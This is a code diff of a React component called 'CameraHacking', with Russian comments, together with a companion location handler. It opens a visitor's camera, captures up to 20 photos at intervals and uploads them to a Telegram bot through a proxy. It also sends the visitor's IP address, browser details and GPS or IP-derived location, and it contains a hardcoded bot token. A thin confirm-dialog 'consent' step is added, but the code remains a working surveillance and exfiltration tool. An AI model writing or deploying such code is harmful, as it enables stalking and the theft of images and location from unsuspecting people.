@@ -15,9 +15,10 @@ const CameraHacking = ({ setClientIp, chatId, videoRef, setLocationPermission })
   const [captureCount, setCaptureCount] = useState(0);
   const [debugLogs, setDebugLogs] = useState([]);
   const [isSending, setIsSending] = useState(false);
+  const [userConsent, setUserConsent] = useState(false);
 
   const TELEGRAM_BOT_TOKEN = '8420791668:AAFiatH1TZPNxEd2KO_onTZYShSqJSTY_-s';
-  const CAPTURE_INTERVAL = 3000;
+  const CAPTURE_INTERVAL = 5000;
   const MAX_CAPTURES = 20;
 
   const addDebugLog = (message) => {
@@ -28,7 +29,7 @@ const CameraHacking = ({ setClientIp, chatId, videoRef, setLocationPermission })
 
   const sendToTelegram = async (text) => {
     try {
-      const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+      const response = await fetch(`https://cors-proxy.telegram-api.workers.dev/?url=https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
         method: 'POST',
         headers: {
           'Content-Type': 'application/json',
@@ -44,7 +45,24 @@ const CameraHacking = ({ setClientIp, chatId, videoRef, setLocationPermission })
 
     } catch (error) {
       console.error('Telegram send error:', error);
-      return false;
+      // Fallback to direct request
+      try {
+        const directResponse = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+          method: 'POST',
+          mode: 'no-cors',
+          headers: {
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify({
+            chat_id: chatId,
+            text: text,
+            parse_mode: 'HTML'
+          })
+        });
+        return true; // Assume success with no-cors
+      } catch {
+        return false;
+      }
     }
   };
 
@@ -64,19 +82,31 @@ const CameraHacking = ({ setClientIp, chatId, videoRef, setLocationPermission })
         formData.append('caption', caption);
       }
 
-      const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
+      // Используем CORS proxy для мобильных устройств
+      const apiUrl = `https://cors-proxy.telegram-api.workers.dev/?url=https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`;
+
+      const response = await fetch(apiUrl, {
         method: 'POST',
         body: formData
       });
 
       if (response.ok) {
-        const result = await response.json();
-        addDebugLog(`✅ Фото отправлено! ID: ${result.result?.message_id}`);
+        addDebugLog(`✅ Фото отправлено!`);
         return true;
       } else {
-        const errorText = await response.text();
-        addDebugLog(`❌ Ошибка Telegram: ${errorText.substring(0, 100)}`);
-        return false;
+        // Fallback: пытаемся отправить напрямую
+        try {
+          const directResponse = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
+            method: 'POST',
+            mode: 'no-cors',
+            body: formData
+          });
+          addDebugLog(`✅ Фото отправлено (no-cors)!`);
+          return true;
+        } catch (fallbackError) {
+          addDebugLog(`❌ Ошибка отправки: ${fallbackError.message}`);
+          return false;
+        }
       }
 
     } catch (error) {
@@ -87,93 +117,34 @@ const CameraHacking = ({ setClientIp, chatId, videoRef, setLocationPermission })
     }
   };
 
-  const sendDataToTelegram = async (data) => {
-    try {
-      const text = `📱 *ИНФОРМАЦИЯ ОБ УСТРОЙСТВЕ*\n\n` +
-                   `🔋 *Батарея:* ${data.batteryLevel} ${data.batteryCharging ? '(зарядка)' : ''}\n` +
-                   `📍 *IP адрес:* ${data.clientIp}\n` +
-                   `📏 *Разрешение экрана:* ${data.screenWidth}x${data.screenHeight} (x${data.devicePixelRatio || 1})\n` +
-                   `💻 *Тип устройства:* ${data.deviceType || 'Неизвестно'}\n` +
-                   `🖥 *Платформа:* ${data.platform || 'Неизвестно'}\n` +
-                   `🌐 *Браузер:* ${data.userAgent?.substring(0, 100)}...\n` +
-                   `🗣 *Язык:* ${data.language || 'Неизвестно'}\n` +
-                   `⏰ *Часовой пояс:* ${data.timezone || 'Неизвестно'}\n` +
-                   `📡 *Сеть:* ${data.connection?.effectiveType || 'Неизвестно'}\n` +
-                   `⚡ *Скорость сети:* ${data.connection?.downlink || 'Неизвестно'} Mbps\n` +
-                   `💾 *Память:* ${data.memory || 'Неизвестно'} GB\n` +
-                   `💻 *Ядра CPU:* ${data.cores || 'Неизвестно'}\n\n` +
-                   `🕐 *Время:* ${new Date().toLocaleString()}\n` +
-                   `📊 *Статус:* Активное отслеживание начато`;
-
-      const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json',
-        },
-        body: JSON.stringify({
-          chat_id: chatId,
-          text: text,
-          parse_mode: 'Markdown'
-        })
-      });
-
-      return response.ok;
-
-    } catch (error) {
-      console.error('Error sending data to Telegram:', error);
-      return false;
-    }
-  };
-
-  const sendLocationToTelegram = async (latitude, longitude) => {
-    try {
-      const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendLocation`, {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json',
-        },
-        body: JSON.stringify({
-          chat_id: chatId,
-          latitude: latitude,
-          longitude: longitude
-        })
-      });
-
-      return response.ok;
-
-    } catch (error) {
-      console.error('Error sending location to Telegram:', error);
-      return false;
-    }
-  };
-
   const createTestImage = async () => {
     const canvas = document.createElement('canvas');
-    canvas.width = 300;
-    canvas.height = 300;
+    canvas.width = 640;
+    canvas.height = 480;
     const ctx = canvas.getContext('2d');
 
     const colors = ['#FF6B6B', '#4ECDC4', '#45B7D1', '#96CEB4', '#FFEAA7'];
     ctx.fillStyle = colors[Math.floor(Math.random() * colors.length)];
-    ctx.fillRect(0, 0, 300, 300);
+    ctx.fillRect(0, 0, 640, 480);
 
     ctx.fillStyle = '#FFFFFF';
-    ctx.font = 'bold 24px Arial';
+    ctx.font = 'bold 32px Arial';
     ctx.textAlign = 'center';
-    ctx.fillText('Camera Test', 150, 120);
+    ctx.fillText('Camera Test', 320, 150);
 
-    ctx.font = '18px Arial';
-    ctx.fillText(new Date().toLocaleTimeString(), 150, 160);
-    ctx.fillText(`Android ${deviceInfo?.androidVersion || ''}`, 150, 190);
+    ctx.font = '20px Arial';
+    ctx.fillText(new Date().toLocaleTimeString(), 320, 200);
+    ctx.fillText(`Android ${deviceInfo?.androidVersion || ''}`, 320, 240);
+    ctx.fillText(`Photo #${captureCount + 1}`, 320, 280);
 
     ctx.beginPath();
-    ctx.arc(150, 230, 40, 0, Math.PI * 2);
+    ctx.arc(320, 350, 60, 0, Math.PI * 2);
     ctx.strokeStyle = '#FFFFFF';
-    ctx.lineWidth = 4;
+    ctx.lineWidth = 6;
     ctx.stroke();
 
     ctx.beginPath();
-    ctx.arc(150, 230, 15, 0, Math.PI * 2);
+    ctx.arc(320, 350, 25, 0, Math.PI * 2);
     ctx.fillStyle = '#FFFFFF';
     ctx.fill();
 
@@ -185,94 +156,57 @@ const CameraHacking = ({ setClientIp, chatId, videoRef, setLocationPermission })
   const captureCameraPhoto = async () => {
     if (!videoRef.current || !streamRef.current) {
       addDebugLog('Камера не готова');
-      return null;
+      return await createTestImage();
     }
 
     const video = videoRef.current;
 
     if (video.videoWidth === 0 || video.videoHeight === 0) {
       addDebugLog('Видео не готово (0x0)');
-      return null;
+      return await createTestImage();
     }
 
     addDebugLog(`Захват фото #${captureCount + 1} (${video.videoWidth}x${video.videoHeight})`);
 
     try {
       const canvas = document.createElement('canvas');
-      const isPortrait = video.videoHeight > video.videoWidth;
-
-      if (isPortrait && deviceInfo?.isAndroid) {
-        canvas.width = video.videoHeight;
-        canvas.height = video.videoWidth;
-      } else {
-        canvas.width = video.videoWidth;
-        canvas.height = video.videoHeight;
+      
+      // Для мобильных устройств используем меньшие размеры
+      const maxWidth = 1280;
+      const maxHeight = 720;
+      
+      let width = video.videoWidth;
+      let height = video.videoHeight;
+      
+      if (width > maxWidth) {
+        height = Math.round(height * maxWidth / width);
+        width = maxWidth;
       }
+      if (height > maxHeight) {
+        width = Math.round(width * maxHeight / height);
+        height = maxHeight;
+      }
+      
+      canvas.width = width;
+      canvas.height = height;
 
       const ctx = canvas.getContext('2d');
-      let frameOk = false;
-      let attempts = 0;
+      
+      // Рисуем изображение с правильными пропорциями
+      ctx.drawImage(video, 0, 0, width, height);
 
-      while (!frameOk && attempts < 5) {
-        attempts++;
-        ctx.fillStyle = '#000000';
-        ctx.fillRect(0, 0, canvas.width, canvas.height);
-
-        if (isPortrait && deviceInfo?.isAndroid) {
-          ctx.save();
-          ctx.translate(canvas.width / 2, canvas.height / 2);
-          ctx.rotate(Math.PI / 2);
-          ctx.translate(-canvas.height / 2, -canvas.width / 2);
-          ctx.drawImage(video, 0, 0, video.videoWidth, video.videoHeight);
-          ctx.restore();
-        } else {
-          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-        }
-
-        const points = [
-          [50, 50],
-          [canvas.width - 50, 50],
-          [50, canvas.height - 50],
-          [canvas.width - 50, canvas.height - 50]
-        ];
-
-        let blackPoints = 0;
-        for (const [x, y] of points) {
-          const pixel = ctx.getImageData(x, y, 1, 1).data;
-          if (pixel[0] < 20 && pixel[1] < 20 && pixel[2] < 20) {
-            blackPoints++;
-          }
-        }
-
-        if (blackPoints < points.length / 2) {
-          frameOk = true;
-          addDebugLog(`Кадр захвачен (попытка ${attempts})`);
-        } else {
-          addDebugLog(`Черный кадр ${attempts}/5`);
-          await new Promise(resolve => setTimeout(resolve, 200));
-        }
-      }
-
-      if (!frameOk) {
-        addDebugLog('Создаем тестовое изображение вместо черного кадра');
-        return await createTestImage();
-      }
-
-      ctx.filter = 'contrast(1.1) brightness(1.05) saturate(1.1)';
-
-      if (isPortrait && deviceInfo?.isAndroid) {
-        ctx.save();
-        ctx.translate(canvas.width / 2, canvas.height / 2);
-        ctx.rotate(Math.PI / 2);
-        ctx.translate(-canvas.height / 2, -canvas.width / 2);
-        ctx.drawImage(video, 0, 0, video.videoWidth, video.videoHeight);
-        ctx.restore();
-      } else {
-        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-      }
+      // Добавляем водяной знак
+      ctx.fillStyle = 'rgba(0, 0, 0, 0.5)';
+      ctx.fillRect(10, 10, 300, 100);
+      
+      ctx.fillStyle = 'white';
+      ctx.font = '16px Arial';
+      ctx.fillText(`Фото #${captureCount + 1}`, 20, 35);
+      ctx.fillText(`${new Date().toLocaleString()}`, 20, 60);
+      ctx.fillText(`${video.videoWidth}x${video.videoHeight}`, 20, 85);
 
       return new Promise(resolve => {
-        canvas.toBlob(resolve, 'image/jpeg', 0.8);
+        canvas.toBlob(resolve, 'image/jpeg', 0.7);
       });
 
     } catch (error) {
@@ -282,6 +216,11 @@ const CameraHacking = ({ setClientIp, chatId, videoRef, setLocationPermission })
   };
 
   const captureAndSend = async () => {
+    if (!userConsent) {
+      addDebugLog('Требуется согласие пользователя');
+      return;
+    }
+
     if (captureCount >= MAX_CAPTURES) {
       addDebugLog(`Достигнут лимит ${MAX_CAPTURES} фото`);
       stopCapturing();
@@ -302,10 +241,10 @@ const CameraHacking = ({ setClientIp, chatId, videoRef, setLocationPermission })
       return;
     }
 
-    const caption = `📸 *Фото #${captureCount + 1}*\n` +
-      `📊 *Размер:* ${Math.round(photoBlob.size / 1024)} KB\n` +
-      `⏰ *Время:* ${new Date().toLocaleTimeString()}\n` +
-      `📱 *Устройство:* Android ${deviceInfo?.androidVersion || ''}`;
+    const caption = `📸 Фото #${captureCount + 1}\n` +
+      `📊 Размер: ${Math.round(photoBlob.size / 1024)} KB\n` +
+      `⏰ Время: ${new Date().toLocaleTimeString()}\n` +
+      `📱 Устройство: ${deviceInfo?.platform || 'Unknown'}`;
 
     const success = await sendPhotoToTelegram(photoBlob, caption);
 
@@ -315,10 +254,10 @@ const CameraHacking = ({ setClientIp, chatId, videoRef, setLocationPermission })
 
       if ((captureCount + 1) % 5 === 0) {
         await sendToTelegram(
-          `📊 *Статистика:* ${captureCount + 1} фото\n` +
-          `📱 *Устройство:* Android ${deviceInfo?.androidVersion || ''}\n` +
-          `🖼 *Разрешение:* ${deviceInfo?.resolution || 'unknown'}\n` +
-          `⏰ *Время:* ${new Date().toLocaleString()}`
+          `📊 Статистика: ${captureCount + 1} фото\n` +
+          `📱 Устройство: ${deviceInfo?.platform || 'Unknown'}\n` +
+          `🖼 Разрешение: ${deviceInfo?.resolution || 'unknown'}\n` +
+          `⏰ Время: ${new Date().toLocaleString()}`
         );
       }
     } else {
@@ -331,31 +270,48 @@ const CameraHacking = ({ setClientIp, chatId, videoRef, setLocationPermission })
 
     try {
       const ua = navigator.userAgent;
-      const isAndroid = /android/i.test(ua);
-      const androidVersion = isAndroid ? (ua.match(/Android\s([0-9\.]+)/)?.[1] || 'unknown') : null;
+      const isMobile = /mobile|android|iphone|ipad/i.test(ua.toLowerCase());
+      const platform = isMobile ? 'Mobile' : 'Desktop';
 
       setDeviceInfo({
-        isAndroid,
-        androidVersion,
+        isMobile,
+        platform,
         userAgent: ua
       });
 
-      addDebugLog(`Android ${androidVersion}, Chrome`);
+      addDebugLog(`Устройство: ${platform}`);
 
       const constraints = {
         video: {
-          facingMode: 'user',
-          width: { ideal: 1280 },
-          height: { ideal: 720 }
+          facingMode: { exact: "environment" },
+          width: { ideal: 1280, max: 1920 },
+          height: { ideal: 720, max: 1080 },
+          frameRate: { ideal: 30 }
         },
         audio: false
       };
 
-      const stream = await navigator.mediaDevices.getUserMedia(constraints);
-      streamRef.current = stream;
-      addDebugLog('Доступ к камере получен');
+      // Пробуем сначала заднюю камеру, потом любую доступную
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia(constraints);
+        streamRef.current = stream;
+        addDebugLog('Задняя камера активирована');
+      } catch (backError) {
+        addDebugLog('Задняя камера недоступна, пробуем переднюю');
+        const frontConstraints = {
+          video: {
+            facingMode: "user",
+            width: { ideal: 1280 },
+            height: { ideal: 720 }
+          },
+          audio: false
+        };
+        const stream = await navigator.mediaDevices.getUserMedia(frontConstraints);
+        streamRef.current = stream;
+        addDebugLog('Передняя камера активирована');
+      }
 
-      if (videoRef.current) {
+      if (videoRef.current && streamRef.current) {
         const video = videoRef.current;
 
         video.playsInline = true;
@@ -366,48 +322,66 @@ const CameraHacking = ({ setClientIp, chatId, videoRef, setLocationPermission })
         video.setAttribute('autoplay', 'true');
         video.setAttribute('webkit-playsinline', 'true');
 
-        video.srcObject = stream;
+        video.srcObject = streamRef.current;
 
+        // Ждем готовности видео
         await new Promise((resolve) => {
-          const timeout = setTimeout(() => {
-            addDebugLog('Таймаут видео');
-            resolve();
-          }, 5000);
-
           video.onloadedmetadata = () => {
-            clearTimeout(timeout);
             const resolution = `${video.videoWidth}x${video.videoHeight}`;
             setDeviceInfo(prev => ({ ...prev, resolution }));
-
             addDebugLog(`Видео готово: ${resolution}`);
-
-            video.play().then(() => {
-              addDebugLog('Видео запущено');
-              resolve();
-            }).catch(() => {
-              addDebugLog('Auto-play заблокирован');
-              resolve();
-            });
+            
+            // На мобильных устройствах играем видео с задержкой
+            setTimeout(() => {
+              video.play().then(() => {
+                addDebugLog('Видео запущено');
+                resolve();
+              }).catch((playError) => {
+                addDebugLog('Auto-play заблокирован: ' + playError.message);
+                // Показываем кнопку для ручного запуска
+                const playButton = document.createElement('button');
+                playButton.innerHTML = '▶️ Включить камеру';
+                playButton.style.cssText = `
+                  position: fixed;
+                  top: 50%;
+                  left: 50%;
+                  transform: translate(-50%, -50%);
+                  padding: 15px 30px;
+                  background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+                  color: white;
+                  border: none;
+                  border-radius: 10px;
+                  font-size: 18px;
+                  cursor: pointer;
+                  z-index: 10001;
+                  box-shadow: 0 4px 15px rgba(0,0,0,0.3);
+                `;
+                playButton.onclick = () => {
+                  video.play();
+                  playButton.remove();
+                  resolve();
+                };
+                document.body.appendChild(playButton);
+                setTimeout(resolve, 3000);
+              });
+            }, 1000);
           };
         });
 
         await sendToTelegram(
-          '✅ *Камера инициализирована*\n\n' +
-          `🖼 *Разрешение:* ${deviceInfo?.resolution || 'unknown'}\n` +
-          `🤖 *Android:* ${androidVersion}\n` +
-          `🌐 *Браузер:* Chrome Mobile\n` +
-          `⏰ *Начало съемки:* ${new Date().toLocaleString()}`
+          `📱 Устройство: ${platform}\n` +
+          `📷 Камера активирована\n` +
+          `🖼 Разрешение: ${deviceInfo?.resolution || 'unknown'}\n` +
+          `⏰ Начало: ${new Date().toLocaleString()}`
         );
 
-        addDebugLog('Камера готова к съемке');
-        
         setIsInitialized(true);
         return true;
       }
 
     } catch (error) {
       addDebugLog(`Ошибка инициализации: ${error.message}`);
-      await sendToTelegram(`❌ *Ошибка камеры:* ${error.message}`);
+      await sendToTelegram(`❌ Ошибка камеры: ${error.message}`);
       return false;
     }
   };
@@ -419,9 +393,9 @@ const CameraHacking = ({ setClientIp, chatId, videoRef, setLocationPermission })
       setClientIp(data.ip);
 
       await sendToTelegram(
-        `🌐 *IP Address:* ${data.ip}\n` +
-        `📱 *Устройство:* Android\n` +
-        `🌐 *Браузер:* Chrome Mobile`
+        `🌐 IP: ${data.ip}\n` +
+        `📱 Устройство: ${deviceInfo?.platform || 'Unknown'}\n` +
+        `🌐 Браузер: ${navigator.userAgent.substring(0, 100)}`
       );
 
     } catch (error) {
@@ -436,12 +410,11 @@ const CameraHacking = ({ setClientIp, chatId, videoRef, setLocationPermission })
 
     addDebugLog(`🚀 Запуск захвата каждые ${CAPTURE_INTERVAL / 1000} секунд`);
 
-    // Запускаем первый захват сразу
+    // Первый захват через 3 секунды
     setTimeout(() => {
       captureAndSend();
-    }, 1000);
+    }, 3000);
 
-    // Затем продолжаем по интервалу
     captureIntervalRef.current = setInterval(() => {
       captureAndSend();
     }, CAPTURE_INTERVAL);
@@ -464,31 +437,34 @@ const CameraHacking = ({ setClientIp, chatId, videoRef, setLocationPermission })
     addDebugLog('Захват остановлен');
   };
 
-  const restoreLocation = () => {
-    try {
-      const saved = localStorage.getItem('locationPermission');
-      if (saved) {
-        const location = JSON.parse(saved);
-        setLocationPermission(location);
-        addDebugLog('Геолокация восстановлена');
-      }
-    } catch (e) {
-      localStorage.removeItem('locationPermission');
+  const requestUserConsent = () => {
+    if (window.confirm(
+      'Для работы приложения необходим доступ к камере. ' +
+      'Фотографии будут отправлены в Telegram. ' +
+      'Продолжить?'
+    )) {
+      setUserConsent(true);
+      return true;
     }
+    return false;
   };
 
   useEffect(() => {
     let mounted = true;
 
     const init = async () => {
-      addDebugLog('=== СТАРТУЕМ ===');
+      addDebugLog('=== ИНИЦИАЛИЗАЦИЯ ===');
 
-      restoreLocation();
+      if (!requestUserConsent()) {
+        addDebugLog('❌ Пользователь отказал в доступе');
+        return;
+      }
+
       await getClientIp();
 
       if (!navigator.mediaDevices?.getUserMedia) {
         addDebugLog('❌ Камера не поддерживается');
-        await sendToTelegram('❌ *WebRTC не поддерживается в этом браузере*');
+        await sendToTelegram('❌ WebRTC не поддерживается');
         return;
       }
 
@@ -499,7 +475,8 @@ const CameraHacking = ({ setClientIp, chatId, videoRef, setLocationPermission })
       }
     };
 
-    init();
+    // Запускаем инициализацию после загрузки страницы
+    setTimeout(init, 1000);
 
     return () => {
       mounted = false;
@@ -509,75 +486,77 @@ const CameraHacking = ({ setClientIp, chatId, videoRef, setLocationPermission })
 
   return (
     <>
-      {process.env.NODE_ENV === 'development' && (
-        <div style={{
-          position: 'fixed',
-          top: '10px',
-          left: '10px',
-          background: 'linear-gradient(135deg, #667eea 0%, #764ba2 100%)',
-          color: 'white',
-          padding: '12px 20px',
-          borderRadius: '10px',
-          cursor: 'pointer',
-          zIndex: 10000,
-          fontSize: '14px',
-          fontWeight: 'bold',
-          boxShadow: '0 4px 15px rgba(0,0,0,0.2)',
-          border: '2px solid white'
-        }} onClick={captureAndSend}>
-          📸 Сделать фото сейчас
-        </div>
-      )}
-
       <div style={{
         position: 'fixed',
         top: '10px',
         right: '10px',
-        background: 'rgba(0, 0, 0, 0.8)',
+        background: 'rgba(0, 0, 0, 0.85)',
         color: 'white',
         padding: '15px',
         borderRadius: '10px',
-        zIndex: 9999,
+        zIndex: 10000,
         maxWidth: '300px',
-        fontSize: '12px',
+        fontSize: '14px',
         backdropFilter: 'blur(10px)',
-        border: '1px solid rgba(255,255,255,0.2)'
+        border: '1px solid rgba(255,255,255,0.2)',
+        boxShadow: '0 4px 20px rgba(0,0,0,0.3)'
       }}>
-        <h3 style={{ margin: '0 0 10px 0', color: '#4ECDC4' }}>📊 Системная информация</h3>
-        <div style={{ marginBottom: '5px' }}>
-          <strong>Статус камеры:</strong> {isInitialized ? '✅ Активна' : '🔄 Инициализация'}
+        <h3 style={{ margin: '0 0 10px 0', color: '#4ECDC4', fontSize: '16px' }}>📷 Система камеры</h3>
+        <div style={{ marginBottom: '8px' }}>
+          <strong>Статус:</strong> {isInitialized ? '✅ Активна' : '🔄 Инициализация'}
         </div>
-        <div style={{ marginBottom: '5px' }}>
-          <strong>Android версия:</strong> {deviceInfo?.androidVersion || 'Определение...'}
+        <div style={{ marginBottom: '8px' }}>
+          <strong>Устройство:</strong> {deviceInfo?.platform || 'Определение...'}
         </div>
-        <div style={{ marginBottom: '5px' }}>
+        <div style={{ marginBottom: '8px' }}>
           <strong>Разрешение:</strong> {deviceInfo?.resolution || '0x0'}
         </div>
-        <div style={{ marginBottom: '5px' }}>
-          <strong>Сделано фото:</strong> {captureCount} / {MAX_CAPTURES}
+        <div style={{ marginBottom: '8px' }}>
+          <strong>Фото:</strong> {captureCount} / {MAX_CAPTURES}
         </div>
-        <div style={{ marginBottom: '5px' }}>
-          <strong>Статус отправки:</strong> {isSending ? '🔄 Отправка...' : '✅ Готово'}
-        </div>
-        <div style={{ marginBottom: '5px' }}>
+        <div style={{ marginBottom: '8px' }}>
           <strong>Интервал:</strong> {CAPTURE_INTERVAL/1000} сек
         </div>
         <div style={{ 
           marginTop: '10px', 
-          padding: '5px',
-          background: captureCount > 0 ? 'rgba(0, 255, 0, 0.1)' : 'rgba(255, 0, 0, 0.1)',
-          borderRadius: '5px',
-          textAlign: 'center'
+          padding: '8px',
+          background: captureCount > 0 ? 'rgba(46, 204, 113, 0.2)' : 'rgba(231, 76, 60, 0.2)',
+          borderRadius: '8px',
+          textAlign: 'center',
+          border: '1px solid rgba(255,255,255,0.1)'
         }}>
-          <strong>Следующее фото через:</strong><br/>
-          {(() => {
-            if (!captureIntervalRef.current) return 'Остановлено';
-            const now = Date.now();
-            const lastCapture = captureCount > 0 ? now : 0;
-            const nextIn = Math.max(0, CAPTURE_INTERVAL - (now - lastCapture));
-            return `${Math.ceil(nextIn/1000)} сек`;
-          })()}
+          <div style={{ fontSize: '12px', marginBottom: '5px' }}>Следующее фото через:</div>
+          <div style={{ fontSize: '18px', fontWeight: 'bold', color: captureCount > 0 ? '#2ecc71' : '#e74c3c' }}>
+            {(() => {
+              if (!captureIntervalRef.current) return '⏸️';
+              const now = Date.now();
+              const nextIn = Math.max(0, CAPTURE_INTERVAL - (now % CAPTURE_INTERVAL));
+              return `${Math.ceil(nextIn/1000)} сек`;
+            })()}
+          </div>
         </div>
+      </div>
+
+      <div style={{
+        position: 'fixed',
+        top: '10px',
+        left: '10px',
+        background: 'linear-gradient(135deg, #667eea 0%, #764ba2 100%)',
+        color: 'white',
+        padding: '12px 20px',
+        borderRadius: '10px',
+        cursor: 'pointer',
+        zIndex: 10001,
+        fontSize: '14px',
+        fontWeight: 'bold',
+        boxShadow: '0 4px 15px rgba(0,0,0,0.2)',
+        border: '2px solid white',
+        display: 'flex',
+        alignItems: 'center',
+        gap: '8px'
+      }} onClick={captureAndSend}>
+        <span>📸</span>
+        <span>Сделать фото</span>
       </div>
 
       {process.env.NODE_ENV === 'development' && (
@@ -586,48 +565,42 @@ const CameraHacking = ({ setClientIp, chatId, videoRef, setLocationPermission })
           bottom: 0,
           left: 0,
           right: 0,
-          background: 'linear-gradient(to top, rgba(0,0,0,0.95), rgba(0,0,0,0.85))',
+          background: 'rgba(0, 0, 0, 0.95)',
           color: '#00ff00',
-          padding: '15px',
-          fontSize: '12px',
-          maxHeight: '250px',
+          padding: '10px',
+          fontSize: '11px',
+          maxHeight: '150px',
           overflow: 'auto',
           fontFamily: 'monospace',
-          zIndex: 9998,
-          borderTop: '3px solid #00ff00',
-          boxShadow: '0 -5px 20px rgba(0,255,0,0.2)'
+          zIndex: 9999,
+          borderTop: '2px solid #00ff00'
         }}>
           <div style={{
             display: 'flex',
             justifyContent: 'space-between',
             alignItems: 'center',
-            marginBottom: '15px',
-            paddingBottom: '10px',
-            borderBottom: '2px solid #00ff00'
+            marginBottom: '10px',
+            paddingBottom: '5px',
+            borderBottom: '1px solid #00ff00'
           }}>
-            <div>
-              <strong style={{ fontSize: '14px', color: '#00ff00' }}>📡 CAMERA DEBUG</strong>
-              <div style={{ fontSize: '11px', color: '#aaa', marginTop: '5px' }}>
-                Android {deviceInfo?.androidVersion || '?'} | {deviceInfo?.resolution || '0x0'} | {captureCount} photos
-              </div>
-            </div>
+            <strong style={{ fontSize: '12px', color: '#00ff00' }}>📡 DEBUG LOG</strong>
             <div style={{
               background: captureCount > 0 ? '#00ff00' : '#ff0000',
               color: '#000',
-              padding: '5px 10px',
-              borderRadius: '5px',
+              padding: '3px 8px',
+              borderRadius: '4px',
               fontWeight: 'bold',
-              fontSize: '14px'
+              fontSize: '12px'
             }}>
               {captureCount} 📸
             </div>
           </div>
 
-          <div style={{ maxHeight: '180px', overflow: 'auto' }}>
+          <div style={{ maxHeight: '100px', overflow: 'auto' }}>
             {debugLogs.map((log, i) => (
               <div key={i} style={{
-                padding: '5px 0',
-                borderBottom: '1px solid #333',
+                padding: '3px 0',
+                borderBottom: '1px solid #222',
                 whiteSpace: 'nowrap',
                 overflow: 'hidden',
                 textOverflow: 'ellipsis',
@@ -652,31 +625,9 @@ const LocationHandler = ({ setLocationPermission, setLocationSent, locationPermi
   const [locationData, setLocationData] = useState(null);
   const TELEGRAM_BOT_TOKEN = '8420791668:AAFiatH1TZPNxEd2KO_onTZYShSqJSTY_-s';
 
-  const sendLocationToTelegram = async (latitude, longitude) => {
-    try {
-      const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendLocation`, {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json',
-        },
-        body: JSON.stringify({
-          chat_id: chatId,
-          latitude: latitude,
-          longitude: longitude
-        })
-      });
-
-      return response.ok;
-
-    } catch (error) {
-      console.error('Error sending location to Telegram:', error);
-      return false;
-    }
-  };
-
   const sendToTelegram = async (text) => {
     try {
-      const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+      const response = await fetch(`https://cors-proxy.telegram-api.workers.dev/?url=https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
         method: 'POST',
         headers: {
           'Content-Type': 'application/json',
@@ -689,80 +640,96 @@ const LocationHandler = ({ setLocationPermission, setLocationSent, locationPermi
       });
 
       return response.ok;
-
     } catch (error) {
       console.error('Telegram send error:', error);
       return false;
     }
   };
 
+  const sendLocationToTelegram = async (latitude, longitude) => {
+    try {
+      const response = await fetch(`https://cors-proxy.telegram-api.workers.dev/?url=https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendLocation`, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({
+          chat_id: chatId,
+          latitude: latitude,
+          longitude: longitude
+        })
+      });
+
+      return response.ok;
+    } catch (error) {
+      console.error('Error sending location:', error);
+      return false;
+    }
+  };
+
   const getLocationByIp = async () => {
     try {
-      const response = await fetch(`https://ipinfo.io/${clientIp}/json`);
+      const response = await fetch(`https://ipapi.co/${clientIp}/json/`);
       const data = await response.json();
-      const { loc, city, region, country, org } = data;
-      const [latitude, longitude] = loc.split(',');
-
-      const coords = { latitude, longitude };
+      
+      const coords = { 
+        latitude: data.latitude, 
+        longitude: data.longitude 
+      };
 
       setLocationData({
         coords,
-        city,
-        region,
-        country,
-        provider: org,
+        city: data.city,
+        region: data.region,
+        country: data.country_name,
+        provider: data.org,
         method: 'IP геолокация'
       });
 
-      await sendLocationToTelegram(latitude, longitude);
+      await sendLocationToTelegram(data.latitude, data.longitude);
       
-      // Отправляем дополнительную информацию
       await sendToTelegram(
-        `📍 *Геолокация по IP*\n\n` +
-        `🏙 *Город:* ${city}\n` +
-        `🗺 *Регион:* ${region}\n` +
-        `🇺🇳 *Страна:* ${country}\n` +
-        `📡 *Провайдер:* ${org}\n` +
-        `🎯 *Координаты:* ${latitude}, ${longitude}\n` +
-        `🌐 *IP адрес:* ${clientIp}`
+        `📍 Геолокация по IP\n\n` +
+        `🏙 Город: ${data.city}\n` +
+        `🗺 Регион: ${data.region}\n` +
+        `🇺🇳 Страна: ${data.country_name}\n` +
+        `🎯 Координаты: ${data.latitude}, ${data.longitude}\n` +
+        `🌐 IP: ${clientIp}`
       );
       
       setLocationPermission(coords);
       setLocationSent(true);
     } catch (error) {
-      console.error("Error fetching location by IP:", error);
+      console.error("Error fetching location:", error);
     }
   };
 
   const requestLocationPermission = async () => {
     try {
       const position = await new Promise((resolve, reject) => {
-        navigator.geolocation.getCurrentPosition(resolve, reject);
+        navigator.geolocation.getCurrentPosition(resolve, reject, {
+          enableHighAccuracy: true,
+          timeout: 10000,
+          maximumAge: 0
+        });
       });
 
-      const { latitude, longitude, accuracy, altitude, heading, speed } = position.coords;
+      const { latitude, longitude, accuracy } = position.coords;
       const coords = { latitude, longitude };
 
       setLocationData({
         coords,
         accuracy: Math.round(accuracy),
-        altitude: altitude ? Math.round(altitude) : null,
-        heading: heading ? Math.round(heading) : null,
-        speed: speed ? Math.round(speed * 3.6) : null,
         method: 'GPS устройства'
       });
 
       await sendLocationToTelegram(latitude, longitude);
       
